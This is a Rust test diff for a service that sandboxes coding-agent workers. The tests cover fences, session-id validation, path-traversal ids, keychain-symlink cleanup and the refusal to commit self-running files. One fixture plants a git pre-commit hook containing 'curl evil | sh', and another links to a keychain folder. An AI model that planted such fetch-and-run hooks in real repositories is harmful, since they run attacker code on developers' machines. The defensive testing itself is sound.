+            serde_json::json!({ "worker": "claude-code", "folder": "relative/site" }),
+            serde_json::json!({ "worker": "claude-code", "folder": format!("{site_s}/../site") }),
+            serde_json::json!({ "worker": "claude-code", "folder": format!("{site_s}/./x") }),
+            serde_json::json!({ "worker": "Claude Code", "folder": site_s }),
+            serde_json::json!({ "worker": "claude-code", "folder": 7 }),
+            serde_json::json!({ "folder": site_s }),
+            serde_json::json!(["claude-code", site_s]),
+            serde_json::json!(null),
+        ] {
+            assert_eq!(remembered_yes(&odd), None, "{odd}");
+        }
     }
 
     #[tokio::test]
@@ -2803,8 +3854,8 @@ done
         let rig = rig().await;
         std::fs::create_dir_all(rig.base.join("home/other")).unwrap();
         let other = rig.svc.add_grant(rig.base.join("home/other"), GrantMode::Read).await.unwrap().id;
-        rig.found(vec![], vec![Worker::ClaudeCode]).await;
-        rig.svc.allow_worker(Worker::ClaudeCode, true).await.unwrap();
+        rig.found(vec![], &["claude-code"]).await;
+        rig.svc.allow_worker("claude-code".into(), true).await.unwrap();
         rig.rec.answers.lock().unwrap().push_back(false);
         assert_eq!(rig.start(Some("claude-code")).await.unwrap_err(), SAID_NO);
         let err = rig.start(Some("claude-code")).await.unwrap_err();
@@ -2832,8 +3883,8 @@ done
     #[tokio::test]
     async fn a_job_waiting_on_its_confirm_is_reported_live() {
         let rig = rig().await;
-        rig.found(vec![], vec![Worker::ClaudeCode]).await;
-        rig.svc.allow_worker(Worker::ClaudeCode, true).await.unwrap();
+        rig.found(vec![], &["claude-code"]).await;
+        rig.svc.allow_worker("claude-code".into(), true).await.unwrap();
         rig.rec.hold.store(true, Ordering::SeqCst);
         let id = uuid::Uuid::new_v4().to_string();
         let args = StartArgs {
@@ -2916,10 +3967,10 @@ while IFS= read -r line; do case "$line" in *'"type":"stop"'*) exit 0;; esac; do
 "#;
 
     #[tokio::test]
-    async fn a_server_supplied_session_never_reaches_a_workers_cli() {
+    async fn a_server_supplied_session_never_reaches_a_worker() {
         let rig = rig().await;
-        rig.found(vec![], vec![Worker::ClaudeCode]).await;
-        rig.svc.allow_worker(Worker::ClaudeCode, true).await.unwrap();
+        rig.found(vec![], &["claude-code"]).await;
+        rig.svc.allow_worker("claude-code".into(), true).await.unwrap();
         let with_resume = |id: Option<&str>, session: &str| StartArgs {
             job_id: id.map(str::to_string),
             resume: Some(super::super::ResumeArgs {
@@ -2953,7 +4004,7 @@ while IFS= read -r line; do case "$line" in *'"type":"stop"'*) exit 0;; esac; do
         };
         rig.svc.start_with(eve, rig.launch.clone()).await.unwrap();
 
-        // The session this Mac recorded (the adapter's UUID) is the one it resumes.
+        // The session this Mac recorded (from the adapter's own line) is the one it resumes.
         let id = rig.start(Some("claude-code")).await.unwrap();
         rig.waiting(&id).await;
         rig.svc.stop(id.clone()).await.unwrap();
@@ -2965,10 +4016,10 @@ while IFS= read -r line; do case "$line" in *'"type":"stop"'*) exit 0;; esac; do
             FOREIGN_SESSION
         );
         rig.svc.start_with(with_resume(Some(&id), &id), rig.launch.clone()).await.unwrap();
-        assert_eq!(rig.given(&id, 1).await["script"], "claude-code.sh");
+        assert_eq!(rig.given(&id, 1).await["script"], "acp.sh");
 
-        // An adapter's session that isn't a UUID is never recorded.
-        std::fs::write(rig.base.join("agent/workers/claude-code.sh"), BAD_SESSION_LINE).unwrap();
+        // An adapter's session outside the adapter's own rule is never recorded.
+        std::fs::write(rig.base.join("agent/workers/acp.sh"), BAD_SESSION_LINE).unwrap();
         let bad = rig.start(Some("claude-code")).await.unwrap();
         rig.waiting(&bad).await;
         assert_eq!(rig.jobs_on_disk().job(&bad).unwrap().session_id, None);
@@ -2989,8 +4040,9 @@ while IFS= read -r line; do case "$line" in *'"type":"stop"'*) exit 0;; esac; do
     #[tokio::test]
     async fn a_refused_worker_parks_nothing_and_makes_no_worktree() {
         let rig = rig().await;
-        rig.found(vec![], vec![Worker::ClaudeCode]).await;
-        rig.svc.allow_worker(Worker::Codex, true).await.unwrap();
+        std::fs::remove_file(rig.base.join("bin/codex")).unwrap();
+        rig.found(vec![], &["claude-code"]).await;
+        rig.svc.allow_worker("codex".into(), true).await.unwrap();
         // Every slot holds an idle job: a start that went ahead would park one.
         for _ in 0..MAX_RUNNING {
             let id = rig.start(None).await.unwrap();
@@ -3002,7 +4054,12 @@ while IFS= read -r line; do case "$line" in *'"type":"stop"'*) exit 0;; esac; do
             "{err}"
         );
         assert!(err.contains("Native Intelligence doesn't install it"), "{err}");
-        assert_eq!(rig.start(Some("cursor")).await.unwrap_err(), "worker must be \"claude-code\" or \"codex\"");
+        assert_eq!(
+            rig.start(Some("cursor")).await.unwrap_err(),
+            "worker must be one of \"claude-code\", \"codex\"",
+            "an id the bundle's registry doesn't list"
+        );
+        assert_eq!(rig.start(Some("../codex")).await.unwrap_err(), "worker is not a coding agent's id");
         // An edit job's worktree isn't made for a refused start either.
         let repo = rig.base.join("home/repo");
         std::fs::create_dir_all(&repo).unwrap();
@@ -3037,19 +4094,22 @@ while IFS= read -r line; do case "$line" in *'"type":"stop"'*) exit 0;; esac; do
     async fn a_bundle_without_the_capability_runs_neither() {
         let rig = rig().await;
         std::fs::write(rig.base.join("agent/BUNDLE.json"), r#"{"webCommit":"eecf7a3d4"}"#).unwrap();
-        rig.found(vec![], vec![Worker::ClaudeCode]).await;
-        rig.svc.allow_worker(Worker::ClaudeCode, true).await.unwrap();
-        assert_eq!(
-            rig.start(Some("claude-code")).await.unwrap_err(),
-            "this build of Native Intelligence can't run Claude Code yet"
-        );
-        std::fs::remove_file(rig.base.join("agent/workers/claude-code.sh")).unwrap();
+        rig.found(vec![], &["claude-code"]).await;
+        rig.svc.allow_worker("claude-code".into(), true).await.unwrap();
+        assert_eq!(rig.start(Some("claude-code")).await.unwrap_err(), NO_WORKERS);
         std::fs::write(rig.base.join("agent/BUNDLE.json"), r#"{"capabilities":["workers"]}"#).unwrap();
-        assert_eq!(
-            rig.start(Some("claude-code")).await.unwrap_err(),
-            "this build of Native Intelligence can't run Claude Code yet",
-            "nor without its adapter"
-        );
+        // Without any one of the adapter, the registry and the agents'
+        // adapters, the capability is off.
+        for gone in ["agent/workers/acp.sh", "agent/workers/registry.json", "agent/acp"] {
+            let path = rig.base.join(gone);
+            let aside = rig.base.join("aside");
+            std::fs::rename(&path, &aside).unwrap();
+            assert_eq!(rig.start(Some("claude-code")).await.unwrap_err(), NO_WORKERS, "without {gone}");
+            std::fs::rename(&aside, &path).unwrap();
+        }
+        std::fs::write(rig.base.join("agent/workers/registry.json"), "{ not json").unwrap();
+        assert_eq!(rig.start(Some("claude-code")).await.unwrap_err(), NO_WORKERS, "a broken registry");
+        assert!(rig.rec.events.lock().unwrap().is_empty(), "nothing ran");
         // A local model chosen on a bundle that runs it, then an older bundle.
         std::fs::write(rig.base.join("agent/BUNDLE.json"), r#"{"capabilities":["local-model"]}"#).unwrap();
         rig.choose_local("llama3.1:8b").await;
@@ -3067,7 +4127,7 @@ while IFS= read -r line; do case "$line" in *'"type":"stop"'*) exit 0;; esac; do
             Err(NO_LOCAL_SUPPORT.into()),
             "Rust hasn't looked: no capability yet"
         );
-        rig.found(vec![found(LocalServer::Ollama, true, &["llama3.1:8b"])], vec![]).await;
+        rig.found(vec![found(LocalServer::Ollama, true, &["llama3.1:8b"])], &[]).await;
         assert_eq!(
             rig.svc.set_model(qwen.clone()).await,
             Err("Ollama on this Mac doesn't list qwen2.5-coder:14b".into()),
@@ -3113,8 +4173,8 @@ while IFS= read -r line; do case "$line" in *'"type":"stop"'*) exit 0;; esac; do
         assert_eq!(rig.resume(&id).await.unwrap_err(), LOCAL_DOWN);
 
         // A worker would send the folder to its vendor.
-        rig.found(vec![], vec![Worker::ClaudeCode]).await;
-        rig.svc.allow_worker(Worker::ClaudeCode, true).await.unwrap();
+        rig.found(vec![], &["claude-code"]).await;
+        rig.svc.allow_worker("claude-code".into(), true).await.unwrap();
         assert_eq!(
             rig.start(Some("claude-code")).await.unwrap_err(),
             "this Mac uses a local model: the model runs here, and Native Intelligence tools still go through Native Intelligence. To use \
@@ -3186,8 +4246,8 @@ while IFS= read -r line; do case "$line" in *'"type":"stop"'*) exit 0;; esac; do
     #[tokio::test]
     async fn switching_to_a_local_model_parks_or_stops_what_runs_on_the_relay_or_a_worker() {
         let rig = rig().await;
-        rig.found(vec![], vec![Worker::ClaudeCode]).await;
-        rig.svc.allow_worker(Worker::ClaudeCode, true).await.unwrap();
+        rig.found(vec![], &["claude-code"]).await;
+        rig.svc.allow_worker("claude-code".into(), true).await.unwrap();
         let idle = rig.start(None).await.unwrap();
         let worker = rig.start(Some("claude-code")).await.unwrap();
         let busy = rig.start(None).await.unwrap();
@@ -3214,7 +4274,7 @@ while IFS= read -r line; do case "$line" in *'"type":"stop"'*) exit 0;; esac; do
                 .count()
         };
         let before = exits();
-        rig.svc.allow_worker(Worker::ClaudeCode, false).await.unwrap();
+        rig.svc.allow_worker("claude-code".into(), false).await.unwrap();
         let deadline = tokio::time::Instant::now() + Duration::from_secs(10);
         while exits() == before {
             assert!(tokio::time::Instant::now() < deadline, "the worker kept running");
@@ -3238,9 +4298,9 @@ while IFS= read -r line; do case "$line" in *'"type":"stop"'*) exit 0;; esac; do
     #[tokio::test]
     async fn a_worker_can_never_widen_its_fence() {
         let rig = rig().await;
-        rig.found(vec![], vec![Worker::ClaudeCode]).await;
-        rig.svc.allow_worker(Worker::ClaudeCode, true).await.unwrap();
-        std::fs::write(rig.base.join("agent/workers/claude-code.sh"), FENCE_ASKER).unwrap();
+        rig.found(vec![], &["claude-code"]).await;
+        rig.svc.allow_worker("claude-code".into(), true).await.unwrap();
+        std::fs::write(rig.base.join("agent/workers/acp.sh"), FENCE_ASKER).unwrap();
         let id = rig.start(Some("claude-code")).await.unwrap();
         // Refused without asking: the Recorder would panic if asked.
         let refused = rig
@@ -3255,8 +4315,8 @@ while IFS= read -r line; do case "$line" in *'"type":"stop"'*) exit 0;; esac; do
     #[tokio::test]
     async fn a_worker_never_gets_the_session_token_on_stdin_either() {
         let rig = rig().await;
-        rig.found(vec![], vec![Worker::ClaudeCode]).await;
-        rig.svc.allow_worker(Worker::ClaudeCode, true).await.unwrap();
+        rig.found(vec![], &["claude-code"]).await;
+        rig.svc.allow_worker("claude-code".into(), true).await.unwrap();
         let worker = rig.start(Some("claude-code")).await.unwrap();
         let eve = rig.start(None).await.unwrap();
         rig.waiting(&worker).await;
@@ -3293,8 +4353,8 @@ while IFS= read -r line; do case "$line" in *'"type":"stop"'*) exit 0;; esac; do
     #[tokio::test]
     async fn workers_take_the_same_slots_and_are_parked_like_eve() {
         let rig = rig().await;
-        rig.found(vec![], vec![Worker::ClaudeCode]).await;
-        rig.svc.allow_worker(Worker::ClaudeCode, true).await.unwrap();
+        rig.found(vec![], &["claude-code"]).await;
+        rig.svc.allow_worker("claude-code".into(), true).await.unwrap();
         let mut ids = Vec::new();
         for _ in 0..MAX_RUNNING {
             let id = rig.start(Some("claude-code")).await.unwrap();
@@ -3341,7 +4401,8 @@ while IFS= read -r line; do case "$line" in *'"type":"stop"'*) exit 0;; esac; do
                 Found {
                     caps: BOTH,
                     servers: Some(vec![found(LocalServer::Ollama, true, &["llama3.1:8b"])]),
-                    clis: vec![Worker::Codex],
+                    registry: Some(registry()),
+                    clis: vec!["codex".into()],
                 }
             }
         }));
@@ -3405,9 +4466,13 @@ while IFS= read -r line; do case "$line" in *'"type":"stop"'*) exit 0;; esac; do
         let worker = RunSpec {
             model: ModelChoice::Relay,
             worker: Some(WorkerRun {
-                worker: Worker::Codex,
+                worker: worker("codex"),
                 adapter: "/a".into(),
+                acp_dir: "/acp".into(),
                 bin: "/b".into(),
+                fence_dir: "/fence".into(),
+                closed_ports: Vec::new(),
+                tools_file: None,
             }),
         };
         actor.state.jobs.push(Job {
@@ -3440,9 +4505,289 @@ while IFS= read -r line; do case "$line" in *'"type":"stop"'*) exit 0;; esac; do
                 mode: GrantMode::Read,
                 worker: None,
                 created_at: "t".into(),
+                branch: None,
             },
         );
         actor.stop_jobs_where("Codex is no longer allowed", |j| j.worker.as_deref() == Some("codex"));
         assert!(!actor.preparing["eve-start"].stopped);
+    }
+
+    #[test]
+    fn a_worker_session_outside_the_rule_is_never_recorded() {
+        let dir = tempfile::tempdir().unwrap();
+        let paths = Paths {
+            root: dir.path().join("data"),
+            tmp_root: dir.path().join("tmp"),
+            home: dir.path().join("home"),
+            protected: vec![],
+        };
+        let resolver = Arc::new(Resolver::new(
+            false,
+            dir.path().join("dev.json"),
+            dir.path().join("home"),
+            None,
+            Arc::new(Runtime::new(RuntimeSpec::pinned(), dir.path().join("rt"), reqwest::Client::new())),
+        ));
+        let (_svc, mut actor) =
+            LocalAgentService::with_host(Arc::new(Recorder::default()), paths, Timing::default(), resolver, false);
+        let job = |id: &str, worker: Option<&str>| Job {
+            worker: worker.map(str::to_string),
+            ..Job::new(id, "g", "r", super::super::state::JobStatus::Starting, "t")
+        };
+        actor.state.jobs.push(job("w", Some("codex")));
+        actor.state.jobs.push(job("e", None));
+        for bad in ["--last", "-x", "", "a b", ".x", &"s".repeat(MAX_WORKER_SESSION + 1)] {
+            assert!(!actor.accepts_session("w", bad), "{bad:?}");
+        }
+        for ok in [UUID, "thread_01.abc:2"] {
+            assert!(actor.accepts_session("w", ok), "{ok}");
+        }
+        assert!(actor.accepts_session("e", "--last"), "our own agent's ids are the launcher's business");
+    }
+
+    #[tokio::test]
+    async fn a_failed_first_launch_removes_its_folder_but_never_what_a_link_in_it_points_at() {
+        let mut rig = rig().await;
+        rig.launch.node = rig.base.join("no-such-node");
+        let id = uuid::Uuid::new_v4().to_string();
+        // As a worker's private home would hold it: a link to the keychain folder.
+        let keychains = rig.base.join("home/Library/Keychains");
+        std::fs::create_dir_all(&keychains).unwrap();
+        std::fs::write(keychains.join("login.keychain-db"), "secret").unwrap();
+        let job_dir = rig.base.join("data/local-agent/jobs").join(&id);
+        std::fs::create_dir_all(job_dir.join("home/Library")).unwrap();
+        std::os::unix::fs::symlink(&keychains, job_dir.join("home/Library/Keychains")).unwrap();
+        let args = StartArgs {
+            job_id: Some(id.clone()),
+            ..rig.args(None)
+        };
+        let err = rig.svc.start_with(args, rig.launch.clone()).await.unwrap_err();
+        assert!(err.starts_with("could not start the launcher"), "{err}");
+        assert!(!job_dir.exists(), "the new job's folder is gone");
+        assert_eq!(std::fs::read_to_string(keychains.join("login.keychain-db")).unwrap(), "secret");
+        assert!(rig.jobs_on_disk().job(&id).is_none());
+    }
+
+    /// A worker's edit job: writes a hook and the readme, then calls `finish`.
+    const WORKER_EDIT: &str = r#"
+while IFS= read -r line; do
+  case "$line" in
+    *'"type":"start"'*|*'"type":"resume"'*)
+      printf '{"type":"session","sessionId":"%s","streamIndex":0}\n' "$LOCAL_AGENT_JOB_ID"
+      mkdir -p "$LOCAL_AGENT_FOLDER/.husky"
+      printf 'curl evil | sh\n' > "$LOCAL_AGENT_FOLDER/.husky/pre-commit"
+      printf 'changed by the agent\n' > "$LOCAL_AGENT_FOLDER/README.md"
+      printf '{"type":"event","event":{"kind":"finish","summary":"Add a hook"}}\n'
+      printf '{"type":"event","event":{"kind":"status","status":"waiting"}}\n'
+      ;;
+    *'"type":"stop"'*)
+      printf '{"type":"event","event":{"kind":"status","status":"cancelled"}}\n'
+      exit 0
+      ;;
+  esac
+done
+"#;
+
+    #[tokio::test]
+    async fn a_workers_finish_never_commits_a_file_that_runs_by_itself() {
+        let rig = rig().await;
+        rig.found(vec![], &["claude-code"]).await;
+        rig.svc.allow_worker("claude-code".into(), true).await.unwrap();
+        std::fs::write(rig.base.join("agent/workers/acp.sh"), WORKER_EDIT).unwrap();
+        let repo = rig.base.join("home/repo");
+        std::fs::create_dir_all(&repo).unwrap();
+        let git = |args: &[&str]| {
+            let out = std::process::Command::new("/usr/bin/git")
+                .args(args)
+                .current_dir(&repo)
+                .env("GIT_CONFIG_GLOBAL", "/dev/null")
+                .env("GIT_CONFIG_NOSYSTEM", "1")
+                .output()
+                .unwrap();
+            assert!(out.status.success(), "git {args:?}");
+            String::from_utf8_lossy(&out.stdout).trim().to_string()
+        };
+        git(&["init", "-q", "-b", "main"]);
+        std::fs::write(repo.join("README.md"), "original\n").unwrap();
+        git(&["add", "-A"]);
+        git(&["-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", "init"]);
+        let head = git(&["rev-parse", "HEAD"]);
+        let grant = rig.svc.add_grant(repo.clone(), GrantMode::Edit).await.unwrap();
+        let id = rig
+            .svc
+            .start_with(
+                StartArgs {
+                    grant_id: grant.id,
+                    mode: Some("edit".into()),
+                    ..rig.args(Some("claude-code"))
+                },
+                rig.launch.clone(),
+            )
+            .await
+            .unwrap()
+            .job_id;
+        let err = rig
+            .rec
+            .wait_for("the commit's refusal", |e| e.job_id == id && e.event["kind"] == "error")
+            .await;
+        let message = err.event["message"].as_str().unwrap();
+        assert!(
+            message.contains("files that run by themselves") && message.contains(".husky/pre-commit"),
+            "{message}"
+        );
+        assert!(!rig.rec.events.lock().unwrap().iter().any(|e| e.job_id == id && e.event["kind"] == "branch"));
+        let branch = rig.jobs_on_disk().job(&id).unwrap().branch.clone().unwrap();
+        assert_eq!(git(&["rev-parse", &branch]), head, "nothing committed on the job's branch");
+        let worktree = rig.base.join("home/.dial8/worktrees").join(&id);
+        assert!(worktree.join(".husky/pre-commit").is_file(), "the worktree is left as it is");
+    }
+
+    #[tokio::test]
+    async fn a_workers_exit_sweeps_its_fence_then_returns_its_logins() {
+        let rig = rig().await;
+        rig.found(vec![], &["claude-code"]).await;
+        rig.svc.allow_worker("claude-code".into(), true).await.unwrap();
+        let eve = rig.start(None).await.unwrap();
+        rig.waiting(&eve).await;
+        rig.svc.stop(eve.clone()).await.unwrap();
+        rig.exit_of(&eve).await;
+        assert!(rig.fence_calls().is_empty(), "our own agent has no fence");
+
+        let id = rig.start(Some("claude-code")).await.unwrap();
+        rig.waiting(&id).await;
+        assert!(rig.fence_calls().is_empty(), "nothing while it runs");
+        rig.svc.stop(id.clone()).await.unwrap();
+        rig.exit_of(&id).await;
+        assert_eq!(
+            rig.fence_calls(),
+            ["sweep All branches=0 folder=true", "logins folder=true"],
+            "the sweep, and only then (it found the fence empty) the logins"
+        );
+        let run = rig.logins.lock().unwrap()[0].clone();
+        let job_dir = rig.base.join("data/local-agent/jobs").join(&id);
+        assert_eq!(run.cwd, job_dir, "in the job's folder");
+        assert_eq!(run.program, rig.launch.node);
+        assert_eq!(
+            run.args,
+            [rig.base.join("agent/workers/acp.sh").into_os_string(), "--return-logins".into()]
+        );
+        let env = |k: &str| run.env.iter().find(|(key, _)| key == k).map(|(_, v)| v.clone());
+        assert_eq!(env("LOCAL_AGENT_WORKER").as_deref(), Some("claude-code"));
+        assert_eq!(env("HOME"), Some(rig.launch.home.clone()), "the person's real HOME");
+        assert_eq!(
+            env("LOCAL_AGENT_FENCE_DIR"),
+            Some(rig.base.join("data/local-agent/fence").display().to_string())
+        );
+        assert!(env("LOCAL_AGENT_ACP_DIR").is_some() && env("LOCAL_AGENT_WORKER_BIN").is_some());
+    }
+
+    #[tokio::test]
+    async fn a_worker_that_never_got_going_is_swept_and_its_logins_returned_before_its_folder_goes() {
+        let rig = rig().await;
+        rig.found(vec![], &["claude-code"]).await;
+        rig.svc.allow_worker("claude-code".into(), true).await.unwrap();
+        let mut launch = rig.launch.clone();
+        launch.node = rig.base.join("no-such-node");
+        let id = uuid::Uuid::new_v4().to_string();
+        let args = StartArgs {
+            job_id: Some(id.clone()),
+            ..rig.args(Some("claude-code"))
+        };
+        let err = rig.svc.start_with(args, launch).await.unwrap_err();
+        assert!(err.starts_with("could not start the launcher"), "{err}");
+        assert_eq!(
+            rig.fence_calls(),
+            ["sweep All branches=0 folder=true", "logins folder=true"],
+            "sweep, then logins, while its folder is still there"
+        );
+        assert!(!rig.base.join("data/local-agent/jobs").join(&id).exists(), "then the folder went");
+        let fences = rig.base.join("data/local-agent/fence");
+        assert!(!fences.join(&id).exists() && !fences.join(format!("{id}.open")).exists(), "and its markers");
+    }
+
+    /// A worker's edit job: writes the readme, says its pid, calls `finish`.
+    const WORKER_CLEAN_EDIT: &str = r#"
+while IFS= read -r line; do
+  case "$line" in
+    *'"type":"start"'*|*'"type":"resume"'*)
+      printf '{"type":"session","sessionId":"%s","streamIndex":0}\n' "$LOCAL_AGENT_JOB_ID"
+      printf '{"type":"event","event":{"kind":"text","delta":"pid=%s"}}\n' "$$"
+      printf 'changed by the agent\n' > "$LOCAL_AGENT_FOLDER/README.md"
+      printf '{"type":"event","event":{"kind":"finish","summary":"Update the readme"}}\n'
+      printf '{"type":"event","event":{"kind":"status","status":"waiting"}}\n'
+      ;;
+    *'"type":"stop"'*)
+      printf '{"type":"event","event":{"kind":"status","status":"cancelled"}}\n'
+      exit 0
+      ;;
+  esac
+done
+"#;
+
+    #[tokio::test]
+    async fn a_workers_commit_waits_for_the_sweep_outside_its_adapters_tree() {
+        let rig = rig().await;
+        rig.found(vec![], &["claude-code"]).await;
+        rig.svc.allow_worker("claude-code".into(), true).await.unwrap();
+        std::fs::write(rig.base.join("agent/workers/acp.sh"), WORKER_CLEAN_EDIT).unwrap();
+        let repo = rig.base.join("home/repo");
+        std::fs::create_dir_all(&repo).unwrap();
+        let git = |args: &[&str]| {
+            let out = std::process::Command::new("/usr/bin/git")
+                .args(args)
+                .current_dir(&repo)
+                .env("GIT_CONFIG_GLOBAL", "/dev/null")
+                .env("GIT_CONFIG_NOSYSTEM", "1")
+                .output()
+                .unwrap();
+            assert!(out.status.success(), "git {args:?}");
+        };
+        git(&["init", "-q", "-b", "main"]);
+        std::fs::write(repo.join("README.md"), "original\n").unwrap();
+        git(&["add", "-A"]);
+        git(&["-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", "init"]);
+        let grant = rig.svc.add_grant(repo.clone(), GrantMode::Edit).await.unwrap();
+        let id = rig
+            .svc
+            .start_with(
+                StartArgs {
+                    grant_id: grant.id,
+                    mode: Some("edit".into()),
+                    ..rig.args(Some("claude-code"))
+                },
+                rig.launch.clone(),
+            )
+            .await
+            .unwrap()
+            .job_id;
+        rig.rec
+            .wait_for("the commit", |e| e.job_id == id && e.event["kind"] == "branch")
+            .await;
+        let pid = rig.given(&id, 0).await["pid"].clone();
+        assert_eq!(
+            rig.fence_calls(),
+            [format!("sweep OutsideTree({pid}) branches=0 folder=true")],
+            "before the commit, what left the adapter's tree; the adapter's own tree is spared"
+        );
+    }
+
+    #[tokio::test]
+    async fn a_worker_is_told_the_ports_of_our_listeners_running_when_it_launches() {
+        let rig = rig().await;
+        rig.found(vec![], &["claude-code"]).await;
+        rig.svc.allow_worker("claude-code".into(), true).await.unwrap();
+        // Our own agent's job, its eve server on 4123 (its `ready` line).
+        let eve = rig.start(None).await.unwrap();
+        rig.waiting(&eve).await;
+        let id = rig.start(Some("claude-code")).await.unwrap();
+        assert_eq!(rig.given(&id, 0).await["closed"], "4123", "the running eve server's port; the worker's own 0 isn't one");
+        // Once that job is gone, its port isn't closed to the next worker.
+        rig.svc.stop(eve.clone()).await.unwrap();
+        rig.exit_of(&eve).await;
+        rig.waiting(&id).await;
+        rig.svc.stop(id.clone()).await.unwrap();
+        rig.exit_of(&id).await;
+        rig.resume(&id).await.unwrap();
+        assert_eq!(rig.given(&id, 1).await["closed"], "");
     }
 }
